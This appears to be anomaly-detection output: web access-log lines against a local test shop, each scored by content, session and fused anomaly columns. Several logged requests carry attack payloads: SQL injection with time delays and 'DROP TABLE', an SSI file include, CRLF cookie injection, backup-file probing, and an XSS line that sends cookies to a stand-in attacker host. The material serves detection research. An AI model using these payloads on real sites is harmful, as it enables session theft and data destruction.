score_content,score_session,score_fused,line
6.890066623687744,26.411399841308594,16.65073323249817,localhost:8080 - - [10/Jan/2025:15:18:41 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6226&B1=Confirmar%2F HTTP/1.1 HTTP/1.1" 200 294 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:18:42 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.731695175170898,25.193195343017578,15.962445259094238,localhost:8080 - - [10/Jan/2025:15:18:42 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6226&B1A=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:18:42 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
81.7132797241211,502.5146179199219,292.1139488220215,localhost:8080 - - [10/Jan/2025:15:18:42 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goldarin5%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=peRVeRtiR&nombre=Lavinia&apellidos=Llecha&email=stalmaster%40fotoseroticas.com.edu&dni=50951157Q&direccion=Calle+Nancales%2C+S%2FN%2C+&ciudad=Urdazubi%2FUrdax&cp=24879&provincia=A+Coru%F1a&ntc=1870284741408418&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1122 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:18:43 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
59.58418273925781,366.22540283203125,212.90479278564453,localhost:8080 - - [10/Jan/2025:15:18:43 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goldarin5&password=peRVeRtiR&nombre=Lavinia&apellidos=Llecha&email=stalmaster%40fotoseroticas.com.edu&dni=50951157Q&direccion=Calle+Nancales%2C+S%2FN%2C+&ciudad=Urdazubi%2FUrdax&cp=24879&provincia=A+Coru%F1a&ntcA=1870284741408418&B1=Registrar HTTP/1.1 HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:18:43 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
8.56466007232666,38.83396530151367,23.699312686920166,localhost:8080 - - [10/Jan/2025:15:18:43 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 348 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:44 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:15:18:44 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:44 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.9123541116714478,13.007440567016602,6.959897339344025,localhost:8080 - - [10/Jan/2025:15:18:44 +0000] "GET http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 219 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.43330496549606323,8.346451759338379,4.389878362417221,localhost:8080 - - [10/Jan/2025:15:18:45 +0000] "GET http://localhost:8080/tienda1/global/titulo.jsp.Inc HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.16199034452438354,4.258908748626709,2.2104495465755463,localhost:8080 - - [10/Jan/2025:15:18:45 +0000] "GET http://localhost:8080/catalog.nsf HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.2127951383590698,15.631360054016113,8.422077596187592,localhost:8080 - - [10/Jan/2025:15:18:45 +0000] "GET http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.gif.old HTTP/1.1 HTTP/1.1" 200 237 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
55.755924224853516,342.4928894042969,199.1244068145752,localhost:8080 - - [10/Jan/2025:15:18:45 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shutterb&password=4ntorchar&nombre=Noam&apellidos=Samper+Folco&email=menant%40venderfotografias.se&dni=33151406B&direccion=Calle+Aladierna%2C+85+3%3FA&ciudad=Buruj%F3n&cp=28648&provincia=Barcel%3Fona&ntc=1260473774275985&B1=Registrar HTTP/1.1 HTTP/1.1" 200 936 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:18:46 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
54.634334564208984,335.529052734375,195.081693649292,localhost:8080 - - [10/Jan/2025:15:18:46 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shutterb&password=4ntorchar&nombre=Noam&apellidos=Samper+Folco&email=menant%40venderfotografias.se&dni=33151406B&direccion=Calle+Aladierna%2C+85+3%3FA&ciudad=Buruj%F3n&cp=28648&provincia=M%E1laga&ntcA=1260473774275985&B1=Registrar HTTP/1.1 HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:18:46 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5895740985870361,9.972355842590332,5.280964970588684,localhost:8080 - - [10/Jan/2025:15:18:46 +0000] "GET http://localhost:8080/tienda1/miembros/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 195 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.1592509746551514,15.173437118530273,8.166344046592712,localhost:8080 - - [10/Jan/2025:15:18:47 +0000] "GET http://localhost:8080/tienda1/miembros/salir.jsp/4861362529278789730~ HTTP/1.1 HTTP/1.1" 200 234 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3869599103927612,3.5031886100769043,2.4450742602348328,localhost:8080 - - [10/Jan/2025:15:18:47 +0000] "GET http://localhost:8080/theme HTTP/1.1 HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5895740985870361,9.972355842590332,5.280964970588684,localhost:8080 - - [10/Jan/2025:15:18:47 +0000] "GET http://localhost:8080/tienda1/imagenes/asf-logo-wide.inc HTTP/1.1 HTTP/1.1" 200 195 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.18097518384456635,3.443740129470825,1.8123576566576958,localhost:8080 - - [10/Jan/2025:15:18:47 +0000] "GET http://localhost:8080/.BAK HTTP/1.1 HTTP/1.1" 200 105 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.429530143737793,52.074485778808594,31.252007961273193,localhost:8080 - - [10/Jan/2025:15:18:48 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=92&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:48 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.177067756652832,50.306522369384766,30.2417950630188,localhost:8080 - - [10/Jan/2025:15:18:48 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Queso+Manchego&precio=85&cantidad=92&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:48 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.21305690705776215,5.514747142791748,2.863902024924755,localhost:8080 - - [10/Jan/2025:15:18:49 +0000] "GET http://localhost:8080/asf-logo-wide.gif/ HTTP/1.1 HTTP/1.1" 200 147 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.052910804748535,49.43463134765625,29.743771076202393,localhost:8080 - - [10/Jan/2025:15:18:49 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anabal&pwd=somn%E1mbula&remember=off%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 387 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:15:18:49 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.688732147216797,46.867305755615234,28.278018951416016,localhost:8080 - - [10/Jan/2025:15:18:49 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anabal&pwdA=somn%E1mbula&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:15:18:50 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.388421893119812,4.715979099273682,3.052200496196747,localhost:8080 - - [10/Jan/2025:15:18:50 +0000] "GET http://localhost:8080/servlet/snoop2 HTTP/1.1 HTTP/1.1" 200 135 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.2638726234436035,13.12624740600586,9.195060014724731,localhost:8080 - - [10/Jan/2025:15:18:50 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3401055335998535,10.415877342224121,6.877991437911987,localhost:8080 - - [10/Jan/2025:15:18:50 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.324052333831787,16.571870803833008,8.947961568832397,localhost:8080 - - [10/Jan/2025:15:18:51 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide~ HTTP/1.1 HTTP/1.1" 200 243 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
38.3763313293457,233.88987731933594,136.13310432434082,localhost:8080 - - [10/Jan/2025:15:18:51 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 HTTP/1.1" 200 783 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:51 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.633997917175293,60.42890548706055,36.03145170211792,localhost:8080 - - [10/Jan/2025:15:18:51 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:52 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.4315505027771,22.85451889038086,14.64303469657898,localhost:8080 - - [10/Jan/2025:15:18:52 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:52 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3825421333312988,4.545295238494873,2.963918685913086,localhost:8080 - - [10/Jan/2025:15:18:52 +0000] "GET http://localhost:8080/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 132 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.22602993249893188,5.729245662689209,2.9776377975940704,localhost:8080 - - [10/Jan/2025:15:18:53 +0000] "GET http://localhost:8080/iisadmpwd/aexp4.htr HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
13.103497505187988,70.47579193115234,41.789644718170166,localhost:8080 - - [10/Jan/2025:15:18:53 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5685any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 453 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:18:53 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
7.310236930847168,29.599018096923828,18.454627513885498,localhost:8080 - - [10/Jan/2025:15:18:53 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5685&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:18:54 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.731695175170898,25.193195343017578,15.962445259094238,localhost:8080 - - [10/Jan/2025:15:18:54 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5685&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:18:54 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
100.24179077148438,615.7708129882812,358.0063018798828,localhost:8080 - - [10/Jan/2025:15:18:54 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=01105274D&direccion=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1236 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:18:55 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
63.14749526977539,388.26788330078125,225.70768928527832,localhost:8080 - - [10/Jan/2025:15:18:55 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=te%3Fruo6&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly&dni=01105274D&direccion=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar HTTP/1.1 HTTP/1.1" 200 993 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:18:55 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
62.345985412597656,383.3135681152344,222.82977676391602,localhost:8080 - - [10/Jan/2025:15:18:55 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly&dni=01105274D&direccionA=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar HTTP/1.1 HTTP/1.1" 200 987 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:18:56 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.555518627166748,9.630423545837402,5.092971086502075,localhost:8080 - - [10/Jan/2025:15:18:56 +0000] "GET http://localhost:8080/tienda1/publico/asf-logo-wide.bak HTTP/1.1 HTTP/1.1" 200 192 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
12.79854965209961,68.40211486816406,40.600332260131836,localhost:8080 - - [10/Jan/2025:15:18:56 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 447 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:56 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:15:18:57 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:18:57 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.056334137916565,14.282293319702148,7.669313728809357,localhost:8080 - - [10/Jan/2025:15:18:57 +0000] "GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.INC HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.324052333831787,16.571870803833008,8.947961568832397,localhost:8080 - - [10/Jan/2025:15:18:57 +0000] "GET http://localhost:8080/tienda1/global/estilos.css/6909030637832563290.jsp HTTP/1.1 HTTP/1.1" 200 243 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4062533378601074,8.046475410461426,4.226364374160767,localhost:8080 - - [10/Jan/2025:15:18:58 +0000] "GET http://localhost:8080/samples/htmlsamp/styles2.htm HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.16501665115356445,4.411726951599121,2.2883718013763428,localhost:8080 - - [10/Jan/2025:15:18:58 +0000] "GET http://localhost:8080/tienda1/.bak HTTP/1.1 HTTP/1.1" 200 129 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.43330496549606323,8.346451759338379,4.389878362417221,localhost:8080 - - [10/Jan/2025:15:18:58 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes.Old HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.33352020382881165,7.197278022766113,3.7653991132974625,localhost:8080 - - [10/Jan/2025:15:18:58 +0000] "GET http://localhost:8080/tienda1/asf-logo-wide.OLD HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
78.51725769042969,482.9096984863281,280.7134780883789,localhost:8080 - - [10/Jan/2025:15:18:59 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Do%F1a+Sancha+16%2C+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1101 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:18:59 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
